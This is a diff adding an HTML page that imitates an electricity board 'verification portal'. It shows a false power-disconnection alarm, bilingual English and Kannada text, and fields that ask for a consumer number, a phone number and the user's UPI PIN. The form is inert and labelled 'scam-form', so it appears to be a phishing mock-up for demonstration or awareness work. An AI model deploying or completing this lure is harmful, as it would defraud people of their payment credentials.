@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Electricity Dept Bill Update - Immediate Action Required</title>
+  <style>
+    body { font-family: -apple-system, sans-serif; background: #f4f6f8; margin: 0; padding: 16px; color: #333; }
+    .card { background: white; border-radius: 12px; padding: 24px; box-shadow: 0 4px 12px rgba(0,0,0,0.08); max-width: 400px; margin: 20px auto; }
+    .alert { background: #ffebee; color: #c62828; padding: 12px; border-radius: 8px; font-weight: bold; font-size: 14px; margin-bottom: 20px; text-align: center; }
+    h2 { font-size: 18px; margin-top: 0; }
+    label { display: block; font-size: 13px; font-weight: 600; margin-bottom: 6px; }
+    input { width: 100%; box-sizing: border-box; padding: 12px; border: 1px solid #ccc; border-radius: 6px; margin-bottom: 16px; font-size: 16px; }
+    button { width: 100%; background: #d32f2f; color: white; border: none; padding: 14px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
+    .kannada-sub { color: #555; font-size: 13px; margin-bottom: 12px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <div class="alert">⚠️ POWER DISCONNECTION NOTICE Tonight 9:30 PM</div>
+    <h2>Electricity Board - Verification Portal</h2>
+    <div class="kannada-sub">ವಿದ್ಯುತ್ ಬಿಲ್ ತಕ್ಷಣ ಪಾವತಿಸಿ - ಸಂಪರ್ಕ ಕಡಿತ ತಪ್ಪಿಸಿ</div>
+    <form id="scam-form" onsubmit="event.preventDefault(); alert('Redirecting...');">
+      <label for="consumer_id">Consumer Number / ಗ್ರಾಹಕರ ಸಂಖ್ಯೆ</label>
+      <input type="text" id="consumer_id" name="consumer_id" placeholder="e.g. 1029384756" required>
+
+      <label for="phone">Registered Mobile Number / ಮೊಬೈಲ್ ಸಂಖ್ಯೆ</label>
+      <input type="tel" id="phone" name="phone" placeholder="Enter 10-digit mobile number" required>
+
+      <label for="upi_pin">Refund / Security UPI PIN (6-digit)</label>
+      <input type="password" id="upi_pin" name="upi_pin" placeholder="Enter UPI PIN to verify bill" required>
+
+      <button type="submit">Pay ₹10 Verification Fee Now</button>
+    </form>
+  </div>
+</body>
+</html>
